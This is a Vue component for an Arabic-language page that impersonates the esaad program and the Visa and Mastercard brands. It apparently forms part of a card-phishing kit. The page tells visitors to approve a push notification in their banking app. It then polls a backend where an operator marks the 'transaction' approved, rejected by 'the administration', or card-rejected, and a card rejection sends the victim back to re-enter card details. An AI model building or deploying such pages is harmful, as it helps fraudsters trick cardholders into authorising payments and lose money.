<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { ShieldCheck } from 'lucide-vue-next';
import { getCardRequest, updateCardRequest, resolveActiveRequestId, setActiveRequestId, type RequestData } from '../api';

const router = useRouter();
const requestData = ref<RequestData | null>(null);
const isSubmitting = ref(false);
const successMessage = ref('');
const errorMessage = ref('');

let statusPoll: ReturnType<typeof setInterval> | null = null;

const isVisa = computed(() => {
  const num = requestData.value?.cardNumber || '';
  return num.startsWith('4');
});

onMounted(async () => {
  try {
    const data = await getCardRequest();
    if (data) {
      requestData.value = data;
    }
  } catch (err) {
    console.error('Error loading request for mobile auth:', err);
  }

  statusPoll = setInterval(async () => {
    try {
      const data = await getCardRequest();
      if (!data) return;
      requestData.value = data;
      if (data.otpStatus === 'approved') {
        if (statusPoll) clearInterval(statusPoll);
        successMessage.value = 'تمت الموافقة على المعاملة بنجاح!';
        setActiveRequestId(null);
        setTimeout(() => router.push('/'), 1800);
      } else if (data.otpStatus === 'rejected') {
        errorMessage.value = 'تم رفض المعاملة من قبل الإدارة.';
      } else if (data.otpStatus === 'card_rejected') {
        if (statusPoll) clearInterval(statusPoll);
        router.push('/card-details');
      }
    } catch {}
  }, 1500);
});

onUnmounted(() => {
  if (statusPoll) clearInterval(statusPoll);
});

const handleApprove = async () => {
  if (isSubmitting.value) return;
  isSubmitting.value = true;
  errorMessage.value = '';

  try {
    const requestId = await resolveActiveRequestId();
    if (!requestId) {
      errorMessage.value = 'لم يتم العثور على الطلب.';
      isSubmitting.value = false;
      return;
    }

    await updateCardRequest(requestId, {
      otp: 'MOBILE_APPROVED',
      otpStatus: 'pending',
      step: 'otp-mobile'
    });
    successMessage.value = 'تم إرسال تأكيد الموافقة، بانتظار الاعتماد النهائي...';
  } catch (err) {
    console.error('Error submitting mobile auth approval:', err);
    errorMessage.value = 'حدث خطأ أثناء إرسال الموافقة.';
  } finally {
    isSubmitting.value = false;
  }
};

const handleExit = () => {
  setActiveRequestId(null);
  router.push('/');
};
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto min-h-screen bg-white flex flex-col justify-between font-sans text-gray-900 select-none">
    
    <!-- Top Brand Header -->
    <header class="w-full bg-[#040c06] py-3 px-4 flex justify-center border-b border-[#009a44]/30">
      <div @click="router.push('/')" class="cursor-pointer flex flex-col items-center select-none">
        <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
        <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
        <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
          <circle cx="14" cy="4" r="2" fill="#39b54a" />
          <circle cx="46" cy="4" r="2" fill="#39b54a" />
          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
        </svg>
      </div>
    </header>

    <!-- Main Container matching reference screenshot -->
    <div class="px-5 py-8 my-auto flex flex-col items-center">
      <div class="w-full max-w-[380px] bg-white rounded-2xl p-6 flex flex-col items-center text-center">
        
        <!-- Card Brand Logo (Visa or Mastercard) -->
        <div class="mb-6 h-12 flex items-center justify-center">
          <img
            v-if="isVisa"
            src="/assets/aistudio/Visa_Inc._logo__2021_present_.svg_2c451104.webp"
            alt="Visa"
            class="h-9 w-auto object-contain"
          />
          <img
            v-else
            src="/assets/aistudio/MasterCard_Logo.svg_5b05ba46.webp"
            alt="Mastercard"
            class="h-11 w-auto object-contain"
          />
        </div>

        <!-- Title -->
        <h1 class="text-xl font-black text-gray-900 mb-6 tracking-tight">
          المصادقة عبر تطبيق الهاتف
        </h1>

        <!-- Instructions Box -->
        <div class="w-full text-right mb-6 space-y-3" dir="rtl">
          <div class="font-extrabold text-sm text-gray-900 mb-2">
            كيفية الموافقة على هذه الدفعة:
          </div>
          <div class="text-xs text-gray-700 font-medium leading-relaxed space-y-2">
            <div>الخطوة 1: افتح تطبيق الهاتف و انقر على الإشعار الفوري</div>
            <div>الخطوة 2: راجع معاملة الدفع ووافق عليها</div>
            <div>الخطوة 3: ارجع إلى هذه الشاشة لإكمال معاملة الشراء</div>
          </div>
        </div>

        <!-- Feedback Banners -->
        <div v-if="successMessage" class="w-full mb-4 p-2.5 rounded-xl bg-green-50 border border-green-200 text-[#008a40] text-xs font-bold">
          {{ successMessage }}
        </div>
        <div v-if="errorMessage" class="w-full mb-4 p-2.5 rounded-xl bg-red-50 border border-red-200 text-red-600 text-xs font-bold">
          {{ errorMessage }}
        </div>

        <!-- Button: لقد وافقت على هذه المعاملة -->
        <button
          @click="handleApprove"
          :disabled="isSubmitting"
          class="w-full bg-[#3b5998] hover:bg-[#324b82] text-white font-extrabold text-sm py-3.5 px-6 rounded-xl shadow-md transition-colors cursor-pointer disabled:opacity-70 flex items-center justify-center gap-2 mb-6"
        >
          <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
          <span v-else>لقد وافقت على هذه المعاملة</span>
        </button>

        <!-- Help / Terms Link -->
        <div class="text-xs text-gray-500 font-medium mb-4">
          <span>هل تحتاج للمساعدة؟</span>
          <span class="mx-2 text-gray-300">|</span>
          <span class="hover:underline cursor-pointer">شروط الاستخدام</span>
        </div>

        <!-- Exit Link -->
        <button
          @click="handleExit"
          class="text-xs text-gray-600 hover:text-gray-900 font-bold cursor-pointer"
        >
          خروج
        </button>

      </div>
    </div>

    <!-- Esaad Footer -->
    <footer class="bg-[#f9fafb] px-5 py-4 text-center text-[11px] text-gray-500 border-t border-gray-100">
      © 2026 esaad, كل الحقوق محفوظة.
    </footer>

  </div>
</template>
